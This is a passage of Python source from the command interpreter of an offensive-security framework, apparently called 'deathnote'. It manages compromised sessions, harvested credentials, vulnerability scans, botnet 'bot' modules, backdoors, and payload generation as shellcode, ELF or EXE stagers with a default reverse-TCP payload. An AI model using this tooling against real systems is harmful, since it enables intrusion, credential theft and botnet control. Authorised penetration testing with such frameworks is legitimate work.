				if pargs.list:
					all_sessions = self.session.get_all_sessions()
					if all_sessions:
						sessions_data = list()
						headers = ("Id", "Name", "User", "Os", "Platform", "Version", "type", "host", "port")
						for session_id in all_sessions.keys():
							session_name = all_sessions[session_id]['name']
							session_user = all_sessions[session_id]['user']
							session_platform = all_sessions[session_id]['arch']
							session_os = all_sessions[session_id]['os']
							session_version = all_sessions[session_id]['version']
							session_type = all_sessions[session_id]['type']
							host = all_sessions[session_id]['host']
							port = all_sessions[session_id]['port']
							sessions_data.append((session_id, session_name, session_user, session_os, session_platform, session_version, session_type, host, port))
						print_info("\n")
						print_info("Active sessions")
						print_table(headers, *sessions_data)
					else:
						print_info('No active sessions')
      
				if isinstance(pargs.upgrade, int):
					all_sessions = self.session.get_all_sessions()
					session = all_sessions[pargs.upgrade]
					self.session.upgrade(pargs.upgrade)
    
				if isinstance(pargs.bot, int):
					all_sessions = self.session.get_all_sessions()
					session = all_sessions[pargs.bot]
					if session['type'] != 'javascript':
						options = session['options']
						print(options)
						if session['name'] != "":
							name = session['name']
						else:
							name = random_text(12)
						create_bot = f"""
from deathnote_module import *

class Module(Bot):

	__info__ = {{
			"name": "bot {name}",
			"description": "bot {name}",
			"listener": "{session['listener']}",
			"host": "{session['host']}",
			"user": "{session['user']}",
			"platform": "{session['arch']}",
			"version": "{session['version']}",
			"type": "{session['type']}",
		}}
		
	def run(self):
"""					
						if options:
							for option in options.items():
								if option[1][0] == "false":
									create_bot += f"\t\tself.add_option('{option[0]}', False)\n"
								elif option[1][0] == "true":
									create_bot += f"\t\tself.add_option('{option[0]}', True)\n"
								else:
									try:
										o = int(option[1][0])
										create_bot += f"\t\tself.add_option('{option[0]}', {o})\n"	
									except:								
										create_bot += f"\t\tself.add_option('{option[0]}', '{option[1][0]}')\n"														
						else:
							create_bot += "\t\tpass"
						if not os.path.exists('modules/bot'):
							os.mkdir('modules/bot')
						with open(f"modules/bot/{name}.py","w") as f:
							f.write(create_bot)
							f.close()
						print_success("Bot created")
					else:
						print_error("Bot doesn't support javascript connection")
		except MyParserException as e:
			print_error(e)

	@module_required
	def command_reload(self, *args, **kwargs):
		module = self.current_module.type_module+"/"+str(self.current_module)
		check = db.query(Modules).filter(Modules.path==module).first()
		if check:
			info = self.current_module._Module__info__
			plugin = ""
			cve = ""
			platform = ""
			if 'cve' in info.keys():
				cve = info['cve']
			if 'plugins' in info.keys():
				if isinstance(info['plugins'], tuple):
					plugin = info['plugins']
			if 'platform' in info.keys():
				if isinstance(info['platform'], str):
					platform = str(info['platform'])
			check.name = self.current_module._Module__info__['name']
			check.description = self.current_module._Module__info__['description']
			check.cve = cve
			check.plugin = plugin
			check.platform = platform
			db.commit()
			print_success("Module updated")
		else:
			info = self.current_module._Module__info__
			plugin = ""
			cve = ""
			platform = ""
			if 'cve' in info.keys():
				cve = info['cve']
			if 'plugins' in info.keys():
				if isinstance(info['plugins'], tuple):
					plugin = info['plugins']
			if 'platform' in info.keys():
				if isinstance(info['platform'], str):
					platform = str(info['platform'])			
			add_module = Modules(type_module=self.current_module.type_module, 
								path=self.current_module, 
								name=self.current_module._Module__info__['name'],
								description=self.current_module._Module__info__['description'],
								cve=cve,
								plugin=plugin,
								platform=platform)
			db.add(add_module)
			db.commit()
			print_success("Module added")
	
	def command_creds(self, *args, **kwargs):
		""" Show all credentials """
		parser = ModuleArgumentParser(description=self.command_creds.__doc__, prog="creds")
		parser.add_argument("-d", dest="delete", help="delete cred", metavar="<id>", type=int)
		parser.add_argument("-l", action="store_true", dest="list", help="list all creds")
		
		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
			else:
				if pargs is None:
					return
				if pargs.list:
					all_creds = db.query(Credentials.id, Credentials.module_name, Credentials.host, Credentials.username, Credentials.password, Credentials.data).all()
					headers= ['Id', 'Module name', 'Host', 'Username', 'Password', 'Data']
					print_table(headers, *all_creds)

				if isinstance(pargs.delete, int):
					delete_creds = db.query(Credentials).filter(Credentials.id == pargs.delete).first()
					if delete_creds:
						db.delete(delete_creds)
						db.commit()
						print_success(f"Creds id {pargs.delete} deleted")
					else:
						print_error("Creds id not found")					

		except MyParserException as e:
			print_error(e)					
			
	def command_workspace(self, *args, **kwargs):
		""" Select a workspace """
		parser = ModuleArgumentParser(description=self.command_workspace.__doc__, prog="workspace")
		parser.add_argument("-a", dest="add", help="add a new workspace", metavar="<name>", type=str)
		parser.add_argument("-d", dest="delete", help="delete wordspace", metavar="<name>", type=str)
		parser.add_argument("-l", action="store_true", dest="list", help="list all workspace")
		parser.add_argument("-s", dest="select", help="select workspace", metavar=("<name>"),type=str)

		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
			else:
				if pargs is None:
					return
				if pargs.list:
					try:
						all_workspace = db.query(Workspace).all()
						for workspace in all_workspace:
								if self.local_storage.get("workspace") == workspace.name:
									print_success(workspace.name)
								else:
									print_status(workspace.name)					
					except:						
						print_error("Error in workspace list")
				if isinstance(pargs.add,str):
					try:
						check = db.query(Workspace).filter(Workspace.name == pargs.add).first()
						if check:
							print_error("Workspace already exist")
						else:
							try:
								new_workspace = Workspace(pargs.add)
								db.add(new_workspace)
								db.commit()
								print_success(f"New workspace created: {pargs.add}")
							except:
								print_error("Error with creation")
					except:
						print_error("Error with database")
				
				if isinstance(pargs.delete,str):
					try:
						if pargs.delete != "default":
							delete_workspace = db.query(Workspace).filter(Workspace.name == pargs.delete).first()
							if delete_workspace:
								db.delete(delete_workspace)
								db.commit()
								print_success("Workspace deleted")
							else:
								print_error("Workspace not found")
						else:
							print_error("You can't delete 'default' workspace but you can: workspace --init")		
					except:
						print_error("Error with database")
				
				if isinstance(pargs.select, str):
					try:
						selected = db.query(Workspace).filter(Workspace.name == pargs.select).first()
						if selected:
							self.local_storage.set("workspace", pargs.select)
							print_success(f"Workspace changed : {pargs.select}")						
						else:
							print_error("No workspace found")
					
					except:
						print_error("Error with database")
						

		except MyParserException as e:
			print_error(e)				

	def command_target(self, *args, **kwargs):
		""" Show target on workspace """
		parser = ModuleArgumentParser(description=self.command_target.__doc__, prog="target")
		parser.add_argument("-a", dest="add", help="add a new target", metavar="<name>", type=str)
		parser.add_argument("-d", dest="delete", help="delete target", metavar="<name>", type=str)
		parser.add_argument("-l", action="store_true", dest="list", help="list targets")		
		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
			else:
				if pargs is None:
					return

				else:
					if pargs.list:
						try:
							all_targets = db.query(Workspace_data).filter(Workspace_data.name==self.local_storage.get("workspace"), 
																			Workspace_data.target==True).all()
							if all_targets:
								for target in all_targets:
									print_info(f"\t [+]{target.ip}")
							else:
								print_error("No target in this workspace")
						except:
							pass
					if isinstance(pargs.add,str):
						try:
							add_target = Workspace_data(name=self.local_storage.get("workspace"), target=True, ip=pargs.add)
							db.add(add_target)
							db.commit()
							print_success("New target add")
						except:
							print_error("Error in database")

					if isinstance(pargs.delete,str):
						try:
							delete_target = db.query(Workspace_data).filter(Workspace_data.ip==pargs.delete).all()
							for i in delete_target:
								db.delete(i)
							db.commit()
							print_success("Target deleted")
						except:
							print_error("Error in database")												
		except MyParserException as e:
			print_error(e)

	def command_tor(self, *args, **kwargs):
		""" Config tor in framework"""
		parser = ModuleArgumentParser(description=self.command_tor .__doc__, prog="tor")
		parser.add_argument("--start", action="store_true", dest="start", help="start config for tor")
		parser.add_argument("--stop", action="store_true", dest="stop", help="stop config for tor")
		parser.add_argument("--status", action="store_true", dest="status", help="show config tor status")
		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
				return
			else:
				if pargs is None:
					return	
				
				if pargs.start:
					tor_status = self.my_config.get_config('TOR','enable')
					if tor_status == "True":
						print_status("Tor already started")
					else:
						self.my_config.set_config('TOR', 'enable', 'True')
						print_success("Tor started")
				
				if pargs.stop:
					tor_status = self.my_config.get_config('TOR','enable')
					if tor_status == "False":
						print_status("Tor already stopped")
					else:
						self.my_config.set_config('TOR', 'enable', 'False')
						print_status("Tor stopped")
										
				if pargs.status:
					tor_status = self.my_config.get_config('TOR','enable')
					if tor_status == "True":
						print_status("Tor started")
					else:
						print_status("Tor stopped")
	
		except MyParserException as e:
			print_error(e)	
	
	def command_remotescan(self, *args, **kwargs):
		""" Execute scan for detect remote vulns"""
		parser = ModuleArgumentParser(description=self.command_remotescan .__doc__, prog="remotescan")
		parser.add_argument("-t", dest="target", help="run remotescan with target", metavar="<target>")
		parser.add_argument("-l", action="store_true", dest="list", help="show list of all scan on this workspace")
		parser.add_argument("-i", dest="info", help="show result on a target", metavar="<id>")
		parser.add_argument("-d", dest="delete", help="delete result", metavar="<id>")
		parser.add_argument("-n", dest="number", help="number of threads, default: 16", metavar="<number>",type=int)
		parser.add_argument("-p", dest="protocol", help="don't scan port and run module in selected port with protocol e.g: -p 2222:ssh,443:https", metavar="<port:protocol>")
		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
				return
			else:
				if pargs is None:
					return				
				if isinstance(pargs.target,str):	
					threads_number = 16	
					if isinstance(pargs.number,int):	
						threads_number = pargs.number					
					print_success("Remote Scan start...")
					remotescan = RemoteScan(pargs.target, threads_number, self.local_storage.get("workspace"))
					if isinstance(pargs.protocol,str):
						protocol = pargs.protocol.split(',')
						for action in protocol:
							port, proto = action.split(':')
							remotescan.port_temporaire[int(port)] = proto	
							remotescan.port_scanned.append(int(port))
							remotescan.personnalize()
					else:
						print_status("Scan target port...")
						remotescan.scan_target()
					print_success("Loading modules...")
					number = remotescan.get_all_modules()
					print_success(f"{number} modules found")
					remotescan.run()
					print_warning("Remotescan run in background, for see result: remotescan -l and after, remotescan -s <id>")
					return
				if pargs.list:
					all_scan = db.query(Remotescan).filter(Remotescan.workspace==self.local_storage.get("workspace")).all()
					if all_scan:
						result = []
						for scan in all_scan:
							count = db.query(Remotescan_data).filter(Remotescan_data.remotescan_id==scan.id).count()
							result.append([scan.id, scan.target, count, scan.status])
						headers = ['id', 'target', 'vuln', 'status']
						print_table(headers, *result)
					else:
						print_error("No scan result") 
					return
				if isinstance(pargs.info,str):
					target = db.query(Remotescan.target).filter(Remotescan.id==pargs.info).first()
					if target:
						print_info(f"\nTarget: {target[0]}\n")
						scan = db.query(Remotescan_data.port, Remotescan_data.nom, Remotescan_data.cve,Remotescan_data.info, Remotescan_data.modules).filter(Remotescan_data.remotescan_id==pargs.info).all()
						headers= ['Port', 'Nom', 'Cve', 'Info', 'Module']
						print_table(headers, *scan)	
					return
				if isinstance(pargs.delete,str):
					return
 
				if isinstance(pargs.number,int):
					print_error("Need a target e.g: remotescan -t 192.168.1.1 -n 16")
				
				if isinstance(pargs.protocol,str):
					print_error("Need a target e.g: remotescan -t 192.168.1.1 -p 2222:ssh,80:http")	
     
		except KeyboardInterrupt:
			pass
		except MyParserException as e:
			print_error(e)

	def command_localscan(self, *args, **kwargs):
		""" Execute scan for detect local vulns"""
		parser = ModuleArgumentParser(description=self.command_localscan .__doc__, prog="localscan")
		parser.add_argument("-s", dest="session", help="run localscan on session", metavar="<session_id>", type=int)
		parser.add_argument("-n", dest="number", help="number of threads, default: 16", metavar="<number>",type=int)
		parser.add_argument("-l", action="store_true", dest="list", help="show list of all scan on this workspace")
		parser.add_argument("-i", dest="info", help="show resultat on a target", metavar="<id>", type=int)

		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
				return
			else:
				if pargs is None:
					return

				if isinstance(pargs.session, int):
					all_sessions = self.session.get_all_sessions()
					try:
						target_session = all_sessions[pargs.session]
					except:
						print_error("Session not found")
						return
					threads_number = 16	
					if isinstance(pargs.number,int):	
						threads_number = pargs.number						
					print_success("Local Scan start...")
					localscan = LocalScan(pargs.session, threads_number)
					print_success("Loading modules...")
					if target_session['platform'] in ['Chrome', 'Firefox', 'Opera']:
						localscan.protocols.append('browser')
					elif target_session['os'] == 'linux':
						localscan.protocols.append('linux')
					elif target_session['os'] == 'windows':
						localscan.protocols.append('windows')
					elif target_session['platform'] == 'php':
						localscan.protocols.append('php')						
					else:
						print_error("No platform detected")
						return
					number = localscan.get_all_modules()
					print_success(f"{number} modules found")
					localscan.run()
					
				if pargs.list:
					all_scan = db.query(Localscan).filter(Localscan.workspace==self.local_storage.get("workspace")).all()
					if all_scan:
						result = []
						for scan in all_scan:
							count = db.query(Localscan_data).filter(Localscan_data.localscan_id==scan.id).count()
							result.append([scan.id, scan.target, count, scan.status])
						headers = ['id', 'target', 'vuln', 'status']
						print_table(headers, *result)
					else:
						print_error("No scan result") 
					return	
						
				if isinstance(pargs.info,int):			
					target = db.query(Localscan.target).filter(Localscan.id==pargs.info).first()
					if target:
						scan = db.query(Localscan_data.nom, Localscan_data.cve, Localscan_data.modules, Localscan_data.info).filter(Localscan_data.localscan_id==pargs.info).all()
						print_info(f"\nTarget: {target[0]}\n")
						headers= ['Name', 'Cve', 'Module', 'Info']
						print_table(headers, *scan)	
					return								
						
		except MyParserException as e:
			print_error(e)

	def command_scan(self, *args, **kwargs):
		""" Scan port of target """
		parser = ModuleArgumentParser(description=self.command_scan .__doc__, prog="scan")
		parser.add_argument("-t", dest="target", help="select a target", metavar="<target>", type=str)
		parser.add_argument("-p", dest="port", help="port (default: 20-1024)", metavar="<port>",default="20-1024", type=str)
		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
				return
			else:
				if pargs is None:
					return
				if isinstance(pargs.target, str):
					print_status("Start scanning...")
					scan = Scanner(target=pargs.target, port=pargs.port, workspace=self.local_storage.get("workspace"))
					scan.scan()
					print_status("Done")
					return

				if isinstance(pargs.port, str):
					print_error(f"You must add target: scan -t target -p {pargs.port}")

		except MyParserException as e:
			print_error(e)		

	def command_load(self, ressource, *args, **kwargs):
	
		if not os.path.exists('scripts'):
			os.mkdir('scripts')
		ressource_file = open("scripts/"+ressource, "r")
		commands = ressource_file.readlines()
		for command in commands:
			c = command.strip()
			if c:
				my_command, args, kwargs = parse_command_line(c)
				command_handler = self.get_command_handler(my_command)
				command_handler(args, **kwargs)

	def command_echo(self, text, *args, **kwargs):
		print_info(text)

	@payload_module_required
	def command_generate(self, *args, **kwargs):
		""" Generate payload format. """
		parser = ModuleArgumentParser(description=self.command_generate.__doc__, prog="generate")
		parser.add_argument("-l", action="store_true", dest="list", help="show a list of available format output")
		parser.add_argument("-f", dest="format", help="format to output", metavar="<format>", type=str)

		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
			else:
				if pargs is None:
					return

				if isinstance(pargs.format, str):
					# si le format est un exe on check si c est possbible
					payload = self.current_module.exploit()
					letters = string.ascii_lowercase
					random_text = ''.join(random.choice(letters) for i in range(10))
					if pargs.format == "raw":
						print_status("Generate payload...")
						p = hexlify(payload).decode()
						shellcode = ""
						for i in range(0, len(p), 2):
							shellcode += f"\\x{p[i:i+2]}"
						print_info("shellcode: " + shellcode)
						print_info()
					elif pargs.format == "elf":
						if self.current_module._Module__info__['category'] == 'stager':
							if self.current_module._Module__info__['platform'] == 'linux':
								elf = ELF()
								with open("output/"+random_text+".elf", 'wb') as f:
									f.write(elf.generate(self.current_module._Module__info__['arch'], payload))
								print_status("Generate payload : output/"+random_text+".elf")
							else:
								print_error("Payload arch not compatible")
						else:
							print_error("Payload not compatible")
       
					elif pargs.format == "exe":
						if self.current_module._Module__info__['category'] == 'stager':
							if self.current_module._Module__info__['platform'] == 'windows':
								pe = PE()
								with open("output/"+random_text+".exe", 'wb') as f:
									f.write(pe.generate(self.current_module._Module__info__['arch'], payload))
								print_status("Generate payload : output/"+random_text+".exe")
							else:
								print_error("Payload not compatible")
						else:
							print_error("Payload not compatible")
					else:
						print_error("Format not in list, type: generate -l")
					
				if pargs.list:
					print_info("\n")
					print_info("\tFormats")
					print_info("\t-------")
					if self.current_module._Module__info__['platform'] == 'linux':
						print_info("\telf")
					if self.current_module._Module__info__['platform'] == 'windows':	
						print_info("\texe")
					if self.current_module._Module__info__['platform'] == 'java':
						print_info("\tjar")	
					print_info("\traw")
					print_info("\n")
				
		except MyParserException as e:
			print_error(e)	

	def command_new_module(self, *args, **kwargs):
		""" Generate new template """
		parser = ModuleArgumentParser(description=self.command_new_module.__doc__, prog="new_module")
		parser.add_argument("-n", dest="name", help="name of new module", metavar="<name>", type=str)
		parser.add_argument("-t", dest="type", help="type of module :{exploit, auxiliary, post, browserexploit, browserauxiliary}", metavar="<type>", type=str)	
		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
			else:
				if pargs is None:
					return 
				if pargs.name:
					module_type = ''
					if pargs.type == 'exploit':
						module_type = 'Exploit'
					elif pargs.type == 'auxiliary':
						module_type = 'Auxiliary'
					elif pargs.type == 'post':
						module_type = 'Post'
					elif pargs.type == 'browserexploit':
						module_type = 'BrowserExploit'
					elif pargs.type == 'browserauxiliary':
						module_type = 'BrowserAuxiliary'
					else:
						print_error("Type not found")
						return				
					if module_type:
						new_module = f"""from deathnote_module import *

class Module({module_type}):

	__info__ = {{
		"name": "{pargs.name}",
		"description": "{pargs.name}",
		"cve": "",
"""
						if module_type == 'Exploit':
							new_module += """
		"platform": "linux",
		"arch": "x86",
		"payload" : {
			"default": "payloads/signles/cmd/python_reverse_tcp",
			"arch": "linux",
			"type": "single",
			}
"""
						new_module += """
	}	
	
	def run(self):
		print_info("New module")
"""
						path_module = f"modules/dev/{pargs.name}.py"
						if os.path.exists(path_module):
							print_error("File already exist")
						else:
							try:
								if not os.path.exists("modules/dev"):
									os.mkdir("modules/dev")
								with open(path_module, "a") as f:
									f.write(new_module)
								print_success(f"New module created: use dev/{pargs.name}")
							except:
								print_error("Dev directory not found")


		except MyParserException as e:
			print_error(e)

	@module_required
	def command_payloads(self, *args, **kwargs):
		if self.list_available_payload:
			print_info()
			print_info('\t\tAvailable payload for current module')
			print_info('\t\t--------------------------------------')
			for p in self.list_available_payload:
				print_info(f"\t\t{p}")
			print_info()
		else:
			print_error('No payload available')
	
	@module_required
	def command_encoders(self, *args, **kwargs):
		if self.list_available_encoders:
			print_info()
			print_info('\t\tAvailable encoders for current module')
			print_info('\t\t--------------------------------------')
			for p in self.list_available_encoders:
				print_info(f"\t\t{p}")
			print_info()
		else:
			print_error('No encoder available')

	def command_search_cve(self, cve, *args, **kwargs):
		try:
			if cve:
				search_module = db.query(Modules).filter(Modules.cve == cve).all()
				search_cve = db.query(Cve).filter(Cve.cve_id == "CVE-"+cve).first()
				if search_module:
					for s in search_module:
						print_info("\n")
						print_info("Module found")
						print_info("------------")
						print_success(s.type_module, s.path)
						print_info()
				else:
					print_status("No module found for this cve")
				if search_cve:
					print_info("\n")
					print_info(f"\tCVE info: {search_cve.cve_id}")
					print_info("\n")
					print_info("\tDescription")
					print_info("\t-----------")
					print_info(f"\t{search_cve.summary}")
					print_info("\n")
					print_info(f"\tCvss2: {search_cve.cvss2}")
					print_info(f"\tCvss3: {search_cve.cvss3}")
					print_info("\n")
				else:
					print_status("No cve found in cve database")
		except:
			print_error("Error with database")

	def command_search(self, word, *args, **kwargs):
		search_info = db.query(Modules.path, Modules.cve, Modules.description).filter(Modules.description.like(f"%{word}%")).all()
		if search_info:
			print_info()
			print_info("Modules found")
			print_info("----------------")
			headers= ['path', 'cve', 'description']
			print_table(headers, *search_info)
			print_info()
	
	def command_search_all(self, word, *args, **kwargs):
		search_info = db.query(Modules.path, Modules.cve, Modules.description).filter(Modules.description.like(f"%{word}%")).all()
		if search_info:
			print_info()
			print_info("Modules found")
			print_info("----------------")
			headers= ['path', 'cve', 'description']
			print_table(headers, *search_info)
			print_info()
		search_in_cve = db.query(Cve.cve_id, Cve.cvss2, Cve.cvss3,Cve.summary).filter(Cve.summary.like(f"%{word}%")).all()
		if search_in_cve:
			print_info()
			print_info("Cve")
			print_info("---")
			headers = ['Cve', 'cvss2', 'cvss3', 'description']
			print_table(headers, *search_in_cve)
			print_info()

	def command_reset_default_workspace(self, *args, **kwargs):
		# Clean remotescan and remotescan_data
		remotescan = db.query(Remotescan).filter(Remotescan.workspace=="default").all()
		for r in remotescan:
			r_data = db.query(Remotescan_data).filter(Remotescan_data.remotescan_id==r.id).all()
			for i in r_data:
				db.delete(i)
			db.delete(r)
		db.commit()
		# Clean localscan and localscan_data
		localscan = db.query(Localscan).filter(Localscan.workspace=="default").all()
		for l in localscan:
			l_data = db.query(Localscan_data).filter(Localscan_data.remotescan_id==l.id).all()
			for i in l_data:
				db.delete(i)
			db.delete(l)
		db.commit()		
		# Clean workspace data
		workspace_data = db.query(Workspace_data).filter(Workspace_data.name=="default").all()
		for w in workspace_data:
			db.delete(w)
		db.commit()
		print_status("Clean done!")

	def command_duplicate_workspace(self, *args, **kwargs):
		""" Duplicate actual workspace """
		parser = ModuleArgumentParser(description=self.command_duplicate_workspace.__doc__, prog="duplicate_workspace")
		parser.add_argument("-n", dest="name", help="name of new workspace", metavar="<name>", type=str, required=True)
		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
				return
			else:
				if pargs is None:
					return 
				else:
					if isinstance(pargs.name, str):
						check = db.query(Workspace).filter(Workspace.name==pargs.name).first()
						if check == None:
							print_status("Created workspace...")
							new_workspace = Workspace(name=pargs.name)
							db.add(new_workspace)
							db.commit()
							print_status("Copy database...")
							#copy remotescan
							remotescan = db.query(Remotescan).filter(Remotescan.workspace==self.local_storage.get("workspace")).all()
							get_id = []
							for i in remotescan:
								add_remotescan = Remotescan(workspace=pargs.name, target=i.target, status=i.status)
								db.add(add_remotescan)
								db.commit()
								get_id.append(i.id)
								
							#copy remotescan_data
							for i in get_id:
								remotescan_data = db.query(Remotescan_data).filter(Remotescan_data.id==i).all()
								for result in remotescan_data:
									add_remotescan_data = Remotescan_data(remotescan_id=i, 
																	target=result.target, 
																	port=result.port, 
																	cvss3=result.cvss3, 
																	nom=result.nom,
																	cve=result.cve,
																	modules=result.modules,
																	info=result.info)
									db.add(add_remotescan_data)
									db.commit()	

							#copy localscan
							localscan = db.query(Localscan).filter(Localscan.workspace==self.local_storage.get("workspace")).all()
							get_id = []
							for i in localscan:
								add_localscan = Localscan(workspace=pargs.name, target=i.target, status=i.status)
								db.add(add_localscan)
								db.commit()
								get_id.append(i.id)
								
							#copy localscan_data
							for i in get_id:
								localscan_data = db.query(Localscan_data).filter(Localscan_data.id==i).all()
								for result in localscan_data:
									add_localscan_data = Localscan_data(localscan_id=i, 
																	target=result.target, 
																	port=result.port, 
																	cvss3=result.cvss3, 
																	nom=result.nom,
																	cve=result.cve,
																	modules=result.modules,
																	info=result.info)
									db.add(add_localscan_data)
									db.commit()	
									
						else:
							print_error("Workspace exist!")								

		except MyParserException as e:
			print_error(e)

	def command_doc(self, lib,  *args, **kwargs):
		if lib:
			lib = 'lib.'+lib
			classname = lib.split('.')[-1].capitalize()
			base_module = __import__('core.base.base_module', fromlist=['BaseModule'])
			all_class_base_module = getattr(base_module, 'BaseModule')
			function_basemodule = []
			for i in dir(all_class_base_module):
				if not i.startswith('__') or not i.startswith('_'):
					function_basemodule.append(i)
			try:
				lib_called = __import__(lib, fromlist=[classname])
			except IndentationError as e:
				print_error(e)
				return
			except ModuleNotFoundError as e:
				print_error(e)
				return
			try:
				lib_loaded = getattr(lib_called, classname)()
			except AttributeError as e:
				print_error(e)
				return
			for i in dir(lib_loaded):
				if not i.startswith('__') or not i.startswith('_'):
					if i not in function_basemodule:
						try:
							my_function = getattr(lib_loaded, i)
							if callable(my_function):
								print_success(i)
								print_info(f"\t- {my_function.__doc__}")
						except:
							continue

	def command_auto_attack(self, *args, **kwargs):
		""" Auto run list view and manipulation. """
		parser = ModuleArgumentParser(description=self.command_auto_attack.__doc__, prog="auto_attack")
		parser.add_argument("-l", "--list", action="store_true", dest="list", help="list all loaded module for auto attack")
		parser.add_argument("-a", "--add", action="store_true", dest="add", help="add current module to auto attack list")
		parser.add_argument("-d", dest="delete", help="delete module in the list", metavar="<id>", type=int)
		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
			else:
				if pargs is None:
					return
				if pargs.list:
					if self.add_auto_attacks:
						print_info()
						print_info("\tId\tType\t\t\tModule")
						print_info("\t--\t----\t\t\t------")
						for count, module in enumerate(self.add_auto_attacks.keys()):
							type_module, _, module_path = module.partition("/")
							print_info(f"\t{count}\t{type_module}\t\t\t{module_path}")
							print_info("\n")
							print_info("\t\t\tOptions")
							print_info("\t\t\t-------")
							for i in self.add_auto_attacks[module].keys():
								if i == "session":
									print_info(f"\t\t\t{i}\t\t=> (When new session created)")
									continue
								if i == "lport":
									print_info(f"\t\t\t{i}\t\t=> {self.add_auto_attacks[module][i]} (auto-increment for multiple clients)")
								else:
									print_info(f"\t\t\t{i}\t\t=> {self.add_auto_attacks[module][i]}")
							print_info()
						print_info()
					else:
						print_error("Empty auto attack list")
				if pargs.add:
					if self.current_module:
						if self.check_options_required(ignore="session"):
							self.add_auto_attacks[f"{self.current_module.type_module}/{self.current_module}"] = {}
							for i in self.current_module.exploit_attributes:
								self.add_auto_attacks[f"{self.current_module.type_module}/{self.current_module}"][i] = self.current_module.exploit_attributes[i][0]
							print_success("Module added : {} ".format(f"{self.current_module.type_module}/{self.current_module}"))
							self.local_storage.set("auto_attack", self.add_auto_attacks)
					else:
						print_error("No module loaded")
				if isinstance(pargs.delete, int):

						for count, i in enumerate(self.add_auto_attacks.keys()):
							if pargs.delete == count:
								print_success(f"Delete in auto attack : {i}")
								del self.add_auto_attacks[i]
								self.local_storage.set("auto_attack", self.add_auto_attacks)
								return
						print_error("Id not found")
					
							
		except MyParserException as e:
			print(e)

	def auto_attack_run_background(self, *args, **kwargs):
		pass

	def command_pattern_create(self, length:int, *args, **kwargs):
		p = pattern_create(length)
		if p:
			print_info(p)

	def command_pattern_research(self, pattern, *args, **kwargs):
		p = pattern_research(pattern)
		if p:
			print_info(p)
	
	def command_busy_port(self, *args, **kwargs):
		""" Get the list of all ports in use """
		print_info()
		print_status("Check port busy 1024-65535")
		for p in range(1024, 65535):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.bind(("0.0.0.0", p))	# Bind to a free port
				s.close()
			except:
				print_info(f"\t{p} is busy")
		print_info()

	def command_pyshell(self, *args, **kwargs):
		print_info()
		print_info(f"Python {platform.python_version()} console")
		while True:		
			command = input(">>> ")
			if "exit" in command:
				break
			try:
				exec(command)
			except SystemExit:
				return
			except (EOFError, KeyboardInterrupt):
				return
			except Exception as e:
				print_error(str(e))
    
	def command_edit(self, *args, **kwargs):
		if self.current_module:
			if shutil.which("vim"):
				with open(humanize_path(self.current_module_path)+".py", "a") as tf:
					call(["vim", tf.name])
			else:
				print_error("Vim not found")
    
	def command_output(self, *args, **kwargs):
		print_info()
		print_info("Output directory")
		print_info("================")
		if not os.path.exists("output"):
			os.mkdir("output")
		dir_list = os.listdir(os.getcwd()+"/output")
		for i in dir_list:
			print_info(i)
		print_info()
    
	def _show_exploits(self, *args, **kwargs):
		modules = db.query(Modules.path,Modules.cve,Modules.description).filter(Modules.type_module=='exploits').all()
		print_info()
		print_info("Modules exploits")
		print_info("----------------")
		headers= ['path', 'cve', 'description']
		print_table(headers, *modules, max_column_length=100)
		print_info()
		
	def _show_auxiliary(self, *args, **kwargs):
		modules = db.query(Modules.path, Modules.description).filter(Modules.type_module=='auxiliary').all()
		print_info()
		print_info("Modules auxiliary")
		print_info("----------------")
		headers = ['path', 'description']
		print_table(headers, *modules)
		print_info()								

	def _show_post(self, *args, **kwargs):
		modules = db.query(Modules.path, Modules.cve, Modules.description).filter(Modules.type_module=='post').all()
		print_info()
		print_info("Modules post")
		print_info("----------------")
		headers= ['path', 'cve', 'description']
		print_table(headers, *modules)
		print_info()	

	def _show_payloads(self, *args, **kwargs):
		modules = db.query(Modules.path, Modules.description).filter(Modules.type_module=='payloads').all()
		print_info()
		print_info("Modules payloads")
		print_info("----------------")
		headers= ['path', 'description']
		print_table(headers, *modules, max_column_length=100)
		print_info()	

	def _show_encoders(self, *args, **kwargs):
		modules = db.query(Modules.path, Modules.description).filter(Modules.type_module=='encoders').all()
		print_info()
		print_info("Modules encoders")
		print_info("----------------")
		headers= ['path', 'description']
		print_table(headers, *modules, max_column_length=100)
		print_info()	

	def _show_listeners(self, *args, **kwargs):
		modules = db.query(Modules.path, Modules.description).filter(Modules.type_module=='listeners').all()
		print_info()
		print_info("Modules listeners")
		print_info("----------------")
		headers= ['path', 'description']
		print_table(headers, *modules, max_column_length=100)
		print_info()				

	def _show_browser_exploits(self, *args, **kwargs):
		modules = db.query(Modules.path,Modules.cve,Modules.description).filter(Modules.type_module=='browser_exploits').all()
		print_info()
		print_info("Modules browser_exploits")
		print_info("----------------")
		headers= ['path', 'cve', 'description']
		print_table(headers, *modules, max_column_length=100)
		print_info()	

	def _show_browser_auxiliary(self, *args, **kwargs):
		modules = db.query(Modules.path, Modules.description).filter(Modules.type_module=='browser_auxiliary').all()
		print_info()
		print_info("Modules browser_auxiliary")
		print_info("----------------")
		headers = ['path', 'description']
		print_table(headers, *modules, max_column_length=100)
		print_info()				

	def _show_backdoors(self, *args, **kwargs):
		modules = db.query(Modules.path, Modules.description).filter(Modules.type_module=='backdoors').all()
		print_info()
		print_info("Modules backdoor")
		print_info("----------------")
		headers = ['path', 'description']
		print_table(headers, *modules, max_column_length=100)
		print_info()

	def _show_bots(self, *args, **kwargs):
		modules = db.query(Modules.path, Modules.description).filter(Modules.type_module=='bot').all()
		print_info()
		print_info("Botnet")
		print_info("----------------")
		headers = ['path', 'description']
		print_table(headers, *modules, max_column_length=100)
